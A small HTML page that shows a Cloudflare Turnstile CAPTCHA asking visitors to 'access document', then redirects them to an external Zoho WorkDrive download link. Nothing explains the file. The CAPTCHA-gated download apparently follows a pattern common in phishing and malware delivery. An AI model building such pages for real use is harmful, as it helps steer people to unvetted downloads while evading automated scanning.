


<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Cloudflare Turnstile Redirect</title>
  <!-- Load the Cloudflare Turnstile API -->
  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>

  <style>
    body, html {
      height: 100%;
      margin: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: Arial, sans-serif;
    }

    .container {
      text-align: center;
    }

    .cf-turnstile {
      margin: 0 auto;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Please complete the CAPTCHA to access document</h2>
    
    <!-- Cloudflare Turnstile widget -->
    <div class="cf-turnstile" data-sitekey="0x4AAAAAAA_KF7HUc4-PMmf6" data-callback="onTurnstileSuccess"></div>
  </div>

  <script>
    // Callback for successful CAPTCHA completion
    function onTurnstileSuccess(token) {
      console.log('Turnstile challenge succeeded, token:', token);

      // After 2 seconds, redirect to another page
      setTimeout(function() {
        window.location.href = "https://workdrive.zohoexternal.com/external/dc98e554a3bf54307b9cc5d75c6a3554522db8d95254914199e45e384dcbdcfe/download";
      }, 2000);
    }
  </script>

  <noscript>
    <p>Please enable JavaScript to proceed.</p>
  </noscript>
</body>
</html>
